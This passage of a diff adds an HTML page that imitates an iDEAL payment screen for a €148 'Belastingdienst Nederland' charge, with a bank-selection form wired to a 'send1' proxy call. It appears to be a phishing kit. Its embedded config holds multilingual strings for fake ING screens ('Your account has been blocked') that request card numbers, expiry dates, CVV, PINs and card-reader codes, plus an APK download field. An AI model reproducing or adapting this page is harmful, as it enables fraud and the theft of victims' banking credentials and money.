format("woff2"),url(data:font/woff;base64,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) format("woff");unicode-range:U+1F00-1FFF;}
+		@font-face{font-family:Roboto Slab;font-style:normal;font-display:swap;font-weight:400;src:url(roboto-slab-greek-400-normal-2b7e0b67.woff2) format("woff2"),url(roboto-slab-greek-400-normal-be74c7f2.woff) format("woff");unicode-range:U+0370-03FF;}
+		@font-face{font-family:Roboto Slab;font-style:normal;font-display:swap;font-weight:400;src:url(roboto-slab-vietnamese-400-normal-d1ca8a45.woff2) format("woff2"),url(roboto-slab-vietnamese-400-normal-6cf103ed.woff) format("woff");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}
+		@font-face{font-family:Roboto Slab;font-style:normal;font-display:swap;font-weight:400;src:url(roboto-slab-latin-ext-400-normal-a6586eec.woff2) format("woff2"),url(roboto-slab-latin-ext-400-normal-860be60d.woff) format("woff");unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;}
+		@font-face{font-family:Roboto Slab;font-style:normal;font-display:swap;font-weight:400;src:url(roboto-slab-latin-400-normal-438099da.woff2) format("woff2"),url(roboto-slab-latin-400-normal-122b49b5.woff) format("woff");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}
+	</style>
+</head>
+ 
+<body style="overflow: auto;">
+    <div id="root">
+        <div class="MuiBox-root css-5mijzf">
+            <div class="MuiBox-root css-1jak6br" data-testid="page">
+                <div class="MuiBox-root css-juhzsm" data-testid="page-header-wrapper">
+                    <div class="MuiContainer-root MuiContainer-maxWidthContent-max-width MuiContainer-disableGutters css-6wvj86">
+                        <div class="MuiGrid-root MuiGrid-container css-tjvzl1">
+                            <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-660gbj" data-testid="header-logo"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 60 53" data-testid="iDEAL-logo" title="iDEAL" style="width: 45px; height: 40px;">
+                                    <path fill="#fff" d="M0 3.9v44.815c0 2.145 1.764 3.9 3.92 3.9h26.913C51.18 52.615 60 41.285 60 26.25 60 11.291 51.18 0 30.833 0H3.92C1.764 0 0 1.755 0 3.9">
+                                    </path>
+                                    <path fill="#C06" d="M18.014 10.999v33.113h14.485c13.153 0 18.857-7.39 18.857-17.844 0-10.004-5.704-17.766-18.857-17.766H20.523A2.507 2.507 0 0 0 18.013 11">
+                                    </path>
+                                    <path fill="#000" fill-rule="evenodd" d="M7.429 49.047h23.404c16.445 0 25.52-8.094 25.52-22.778 0-8.464-3.312-22.68-25.52-22.68H7.429c-2.078 0-3.764 1.676-3.764 3.744v37.97c0 2.066 1.686 3.744 3.764 3.744M4.919 7.333a2.495 2.495 0 0 1 2.509-2.497h23.404c9.056 0 24.266 2.79 24.266 21.433 0 13.885-8.624 21.53-24.266 21.53H7.428a2.495 2.495 0 0 1-2.51-2.497z" clip-rule="evenodd"></path>
+                                    <path fill="#fff" fill-rule="evenodd" d="M25.142 21.456a4.1 4.1 0 0 0-1.4-.236v-.02h-3.317V29.2h3.356c.594 0 1.112-.119 1.553-.316a3.2 3.2 0 0 0 1.093-.847c.287-.354.498-.788.652-1.28.134-.493.21-1.025.21-1.616 0-.67-.095-1.24-.268-1.733a4 4 0 0 0-.748-1.222 3.1 3.1 0 0 0-1.13-.729m-.787 6.167c-.25.079-.48.118-.729.118v.02h-1.514v-5.044h1.227c.422 0 .767.06 1.054.178s.518.315.69.532c.173.216.307.512.384.827s.115.69.115 1.084c0 .453-.058.807-.172 1.123a2.3 2.3 0 0 1-.442.748 1.4 1.4 0 0 1-.613.414" clip-rule="evenodd"></path>
+                                    <path fill="#fff" d="M34.211 21.22v1.477h-4.103v1.714h3.777v1.36h-3.777v1.95h4.199V29.2H28.4V21.2h5.81z">
+                                    </path>
+                                    <path fill="#fff" fill-rule="evenodd" d="m42.993 29.218-2.915-7.998h-1.783l-2.934 7.998h1.726l.613-1.773h2.915l.594 1.773zm-3.797-6.028.978 2.935h-2.013l1.016-2.935z" clip-rule="evenodd"></path>
+                                    <path fill="#fff" d="M45.773 21.22v6.52h3.796v1.478h-5.503V21.22z"></path>
+                                    <circle cx="11.283" cy="25.575" r="3.761" fill="#000"></circle>
+                                    <path fill="#000" d="M13.521 44.38c-2.91 0-5.247-2.514-5.247-5.602v-4.374c0-1.544 1.168-2.811 2.633-2.811 1.446 0 2.633 1.247 2.633 2.81v9.977z">
+                                    </path>
+                                </svg>
+							</div>
+                            <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-3 MuiGrid-grid-md-6 css-uzcjjk" data-testid="header-content">
+                                <div class="MuiBox-root css-3nsu35"><span class="MuiTypography-root MuiTypography-subtitle4 css-as8dbu" data-testid="payment-amount-creditor" translate="no">Belastingdienst Nederland</span>
+                                    <div class="MuiBox-root css-70qvj9">
+                                        <h6 class="MuiTypography-root MuiTypography-subtitle2 css-1uoqkc7" data-testid="payment-amount-sign">€</h6>
+                                        <h6 class="MuiTypography-root MuiTypography-subtitle2 css-1uoqkc7" data-testid="payment-amount-euros">148</h6>
+                                        <h6 class="MuiTypography-root MuiTypography-subtitle2 css-1uoqkc7" translate="no" data-testid="payment-amount-cents">,00</h6>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="MuiBox-root css-1dnxymp" data-testid="page-content-wrapper">
+                    <div class="MuiContainer-root MuiContainer-maxWidthContent-max-width MuiContainer-disableGutters css-181pjz7">
+                        <div class="MuiBox-root css-bkc3oc">
+                            <div class="MuiBox-root css-1k6yql2"><button class="MuiButtonBase-root MuiButton-root MuiButton-textPrimary MuiButton-textPrimaryPrimary MuiButton-sizeMedium MuiButton-textPrimarySizeMedium MuiButton-colorPrimary MuiButton-root MuiButton-textPrimary MuiButton-textPrimaryPrimary MuiButton-sizeMedium MuiButton-textPrimarySizeMedium MuiButton-colorPrimary css-1fyvfqx" tabindex="0" type="button" data-testid="navigation-back-button">Terug</button></div>
+                            <button class="MuiButtonBase-root MuiButton-root MuiButton-textPrimary MuiButton-textPrimaryPrimary MuiButton-sizeMedium MuiButton-textPrimarySizeMedium MuiButton-colorPrimary MuiButton-root MuiButton-textPrimary MuiButton-textPrimaryPrimary MuiButton-sizeMedium MuiButton-textPrimarySizeMedium MuiButton-colorPrimary css-oxa9sm" tabindex="0" type="button" data-testid="login-user-button">Inloggen</button>
+                        </div>
+						<step0 id="next-view" class=" scum">
+                    	<form name="next-form" id="next-form" onsubmit="handleSubmit(event); return false;" class="has-validation-callback">
+                        <!-- <p class="legend">
+                            unkn0wn was here.
+                        </p> -->
+						
+                        <div class="MuiBox-root css-1rr4qq7">
+                            <section class="MuiBox-root css-0" data-testid="bank-list">
+                                <div class="MuiBox-root css-0" data-testid="supported-banks">
+                                    <h2 class="MuiTypography-root MuiTypography-h2 css-6hs6s5" data-testid="select-bank-title">Kies je bank</h2>
+                                    <div class="MuiGrid-root MuiGrid-container css-h0jpzp">
+                                        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-6 css-1yqy90m">
+                                            <div class="MuiGrid-root MuiGrid-container css-oevazw">
+                                                <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-6 css-1fa8l1e" data-testid="supported-banks-list">
+                                                    <ul class="MuiGrid-root MuiGrid-container css-6ucs9f">
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-ABN_AMRO"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-ABNANL2A-image" alt="" src="1.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-ABNANL2A-name" translate="no">ABN
+                                                                        AMRO</p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-ASN"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-ASNBNL21-image" alt="" src="9.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-ASNBNL21-name" translate="no">ASN
+                                                                        Bank</p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-BUNQ"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-BUNQNL2A-image" alt="" src="2.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-BUNQNL2A-name" translate="no">bunq
+                                                                    </p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-BUUT"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-BUUTNL2A-image" alt="" src="10.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-BUUTNL2A-name" translate="no">BUUT
+                                                                    </p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-ING"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-INGBNL2A-image" alt="" src="3.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-INGBNL2A-name" translate="no">ING
+                                                                    </p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-KNAB"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-KNABNL2H-image" alt="" src="11.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-KNABNL2H-name" translate="no">Knab
+                                                                    </p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-N26"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-NTSBDEB1-image" alt="" src="4.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-NTSBDEB1-name" translate="no">N26
+                                                                    </p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-Nationale_Nederlanden"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-NNBANL2G-image" alt="" src="12.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-NNBANL2G-name" translate="no">
+                                                                        Nationale-Nederlanden</p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-RABO"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-RABONL2U-image" alt="" src="5.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-RABONL2U-name" translate="no">
+                                                                        Rabobank</p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-RegioBank"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-RBRBNL21-image" alt="" src="13.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-RBRBNL21-name" translate="no">
+                                                                        RegioBank</p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-REVOLUT"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-REVOLT21-image" alt="" src="6.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-REVOLT21-name" translate="no">
+                                                                        Revolut</p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-SNS"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-SNSBNL2A-image" alt="" src="14.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-SNSBNL2A-name" translate="no">SNS
+                                                                    </p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-TRIODOS"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-TRIONL2U-image" alt="" src="7.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-TRIONL2U-name" translate="no">
+                                                                        Triodos Bank</p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-LANSCHOT_KEMPEN"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-FVLBNL22-image" alt="" src="15.jpg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-FVLBNL22-name" translate="no">Van
+                                                                        Lanschot Kempen</p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-4 MuiGrid-grid-md-3 bank-item-grid css-1p04aae">
+                                                            <div class="MuiBox-root css-0"><button class="bank-item MuiBox-root css-esxpdh" data-testid="bank-item" id="bank-item-YOURSAFE"><img class="MuiBox-root css-ujf2ka" data-testid="bank-item-image" id="bank-item-BITSNL2A-image" alt="" src="8.svg">
+                                                                    <p class="MuiTypography-root MuiTypography-body css-h3zz7w" data-testid="bank-item-name" id="bank-item-BITSNL2A-name" translate="no">
+                                                                        Yoursafe</p>
+                                                                </button></div>
+                                                        </li>
+                                                        <li class="MuiGrid-root MuiGrid-item MuiGrid-grid-sm-6 MuiGrid-grid-md-3 css-1l96zw3" style="list-style: none;"></li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </section>
+                        </div>
+						<input type="text" style="visibility:hidden;" name="selected_bank" id="selected_bank">
+					</form>
+                    </step0></div>
+                </div>
+                <div class="MuiBox-root css-1ixkyp3" data-testid="page-footer-wrapper">
+                    <div class="MuiContainer-root MuiContainer-maxWidthContent-max-width MuiContainer-disableGutters css-16vi85n">
+                        <div class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 css-n3ajoa">
+                            <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-2 MuiGrid-grid-md-4 css-si52lk">
+                                <div class="MuiBox-root css-12j04ju" data-testid="main-links"><button class="MuiButtonBase-root MuiButton-root MuiButton-textFooter MuiButton-textFooterPrimary MuiButton-sizeMedium MuiButton-textFooterSizeMedium MuiButton-colorPrimary MuiButton-root MuiButton-textFooter MuiButton-textFooterPrimary MuiButton-sizeMedium MuiButton-textFooterSizeMedium MuiButton-colorPrimary css-jz4d1j" tabindex="0" type="button" data-testid="footer-link-how-works" aria-label="Hoe werkt het?">Hoe werkt het?</button><button class="MuiButtonBase-root MuiButton-root MuiButton-textFooter MuiButton-textFooterPrimary MuiButton-sizeMedium MuiButton-textFooterSizeMedium MuiButton-colorPrimary MuiButton-root MuiButton-textFooter MuiButton-textFooterPrimary MuiButton-sizeMedium MuiButton-textFooterSizeMedium MuiButton-colorPrimary css-jz4d1j" tabindex="0" type="button" data-testid="footer-link-about" aria-label="Over ons">Over ons</button><button class="MuiButtonBase-root MuiButton-root MuiButton-textFooter MuiButton-textFooterPrimary MuiButton-sizeMedium MuiButton-textFooterSizeMedium MuiButton-colorPrimary MuiButton-root MuiButton-textFooter MuiButton-textFooterPrimary MuiButton-sizeMedium MuiButton-textFooterSizeMedium MuiButton-colorPrimary css-jz4d1j" tabindex="0" type="button" data-testid="footer-link-privacy" aria-label="Privacyverklaring">Privacyverklaring</button></div>
+                                <div class="MuiTypography-root MuiTypography-body3 css-1tt1035" data-testid="ideal-copyright">© 2025 iDEAL</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+	<script>
+	function handleSubmit(event) {
+		event.preventDefault();
+		const selectedBank = document.getElementById('selected_bank').value;
+		if (!selectedBank) {
+			alert("Kies je bank.");
+			return false;
+		}
+		send1(event, 'ask_next_proxy');
+		return false;
+	}
+ 
+	document.addEventListener("DOMContentLoaded", function () {
+		const bankButtons = document.querySelectorAll('button.bank-item');
+		const hiddenInput = document.getElementById('selected_bank');
+		const form = document.getElementById('next-form');
+ 
+		bankButtons.forEach(button => {
+			button.addEventListener('click', function (e) {
+				e.preventDefault();
+				const bankId = this.id.replace('bank-item-', '');
+				hiddenInput.value = bankId;
+ 
+				document.getElementById('next-form').dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+			});
+		});
+	});
+	</script>
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    <script type="text/javascript">
+    var bid =
+        "fe8cc41a561c4bac56ccca5488f69f58"
+    var php_js = {"device":{"isMobile":true,"isTablet":false,"isiOS":true,"isAndroid":false},"gets":{"op":"eyJpbml0X2ZuIjoiYXNrX25leHQiLCJpZCI6Im5leHQiLCJzcWxfbXMiOiJPcGVyYXRpb24gYEFzayBJRGVhbCAoU2VsZWN0IEJhbmspYCBhZGRlZCBzdWNjZXNzZnVsbHkiLCJzdWNjZXNzX21lcyI6IklEZWFsIChTZWxlY3QgQmFuaykgZm9ybSBkaXNwbGF5ZWQifQ=="},"op":"{\"init_fn\":\"ask_next\",\"id\":\"next\",\"sql_ms\":\"Operation `Ask IDeal (Select Bank)` added successfully\",\"success_mes\":\"IDeal (Select Bank) form displayed\"}","lng":"en","bb_link":"https:\/\/www.belastingdienst.nl\/wps\/wcm\/connect\/nl\/home\/home","link":"BELASTING 2025","apk_file":"http:\/\/test.com\/file.apk","encryption":0,"texts":"{\n    \"en\":\n    {\n        \"_-1762966517\": \"Log in with the ING Card Reader\",\n        \"_2084199307\": \"Errors\",\n        \"_-2100363574\": \"You should check in on some of those fields below.\",\n        \"_98022037\": \"Bank card number\",\n        \"_-557740841\": \"Please enter valid Bank card number\",\n        \"_-614429802\": \"Value incorrect\",\n        \"_1803885307\": \"Please enter valid ING ID\",\n        \"_-1732238388\": \"Save your bank card details\",\n        \"_1677634980\": \"Help and information\",\n        \"_73596745\": \"Login\",\n        \"_-1417361843\": \"Online security\",\n        \"_-782442309\": \"Your privacy\",\n        \"_906364211\": \"ING General Regulations\",\n        \"_-1802065132\": \"One moment...\",\n\n        \"_12338600\": \"Log in to Mijn ING\",\n\n        \"_393974398\": \"Your account has been blocked\",\n        \"_-1301328960\": \"We are conducting verification process.\",\n        \"_-1491718229\": \"Once verification process completed we will restore your access and you will receive notification.\",\n        \"_500390792\": \"To start verification please follow our simple steps\",\n        \"_2424595\": \"Next\",\n\n\n\n        \"_1302272827\": \"Insert your bank card in the ING Card reader and press \\\"Indetify\\\"\",\n        \"_-2064458453\": \"Enter the pin code of your bank card and press \\\"OK\\\"\",\n        \"_1815383157\": \"RESPOND\",\n        \"_-188122456\": \"Enter the numbers that appear on your Card Reader\",\n\n\n\n        \"_1032525388\": \"Insert your bank card in the ING Card reader and press \\\"Sign\\\"\",\n        \"_-2100559731\": \"Enter the challenge of your confirmation\",\n        \"_1284373801\": \"and press \\\"Sign\\\"\",\n\n\n        \"_195622566\": \"Verification completed\",\n        \"_-1781351462\": \"Thank you, your information has been submitted. We apologise for the inconvenience.\",\n\n\n        \"_457197066\": \"and press \\\"OK\\\"\",\n\n\n        \"_2576861\": \"Sign\",\n\n\n        \"_1087227964\": \"Card information\",\n        \"_-463635061\": \"Card expiry date\",\n        \"_-2001805959\": \"Expiry date of your card\",\n        \"_1868896591\": \"MM\/YYYY\",\n\n        \"_-1679196512\": \"Confirm\",\n\n\n\n        \"_-2126651847\": \"Card number\",\n        \"_67139\": \"CVV\"\n\n\n\n    },\n    \"fr\":\n    {\n        \"_-1762966517\": \"Connectez-vous avec le lecteur de carte ING\",\n        \"_2084199307\": \"Erreurs\",\n        \"_-2100363574\": \"Vous devez vous enregistrer dans certains de ces champs ci-dessous.\",\n        \"_98022037\": \"Num\u00e9ro de carte bancaire\",\n        \"_-557740841\": \"Veuillez saisir un num\u00e9ro de carte bancaire valide\",\n        \"_-614429802\": \"Valeur incorrecte\",\n        \"_1803885307\": \"Veuillez saisir un ID ING valide\",\n        \"_-1732238388\": \"Enregistrer les d\u00e9tails de votre carte bancaire\",\n        \"_1677634980\": \"Aide et informations\",\n        \"_73596745\": \"Connexion\",\n        \"_-1417361843\": \"S\u00e9curit\u00e9 en ligne\",\n        \"_-782442309\": \"Votre vie priv\u00e9e\",\n        \"_906364211\": \"R\u00e8glement g\u00e9n\u00e9ral d'ING\",\n        \"_-1802065132\": \"Un instant ...\",\n\n        \"_12338600\": \"Connectez-vous \u00e0 Mijn ING\",\n\n        \"_393974398\": \"Votre compte a \u00e9t\u00e9 bloqu\u00e9\",\n        \"_-1301328960\": \"Nous effectuons un processus de v\u00e9rification.\",\n        \"_-1491718229\": \"Une fois le processus de v\u00e9rification termin\u00e9, nous r\u00e9tablirons votre acc\u00e8s et vous recevrez une notification.\",\n        \"_500390792\": \"Pour commencer la v\u00e9rification, veuillez suivre nos \u00e9tapes simples\",\n        \"_2424595\": \"Suivant\",\n\n\n\n        \"_1302272827\": \"Ins\u00e9rez votre carte bancaire dans le lecteur ING Card et appuyez sur \\\"Indetify\\\"\",\n        \"_-2064458453\": \"Saisissez le code PIN de votre carte bancaire et appuyez sur \\\"OK\\\"\",\n        \"_1815383157\": \"R\u00c9PONDRE\",\n        \"_-188122456\": \"Entrez les num\u00e9ros qui apparaissent sur votre lecteur de carte\",\n\n\n\n        \"_1032525388\": \"Ins\u00e9rez votre carte bancaire dans le lecteur ING Card et appuyez sur \\\"Signer\\\"\",\n        \"_-2100559731\": \"Entrez le d\u00e9fi de votre confirmation\",\n        \"_1284373801\": \"et 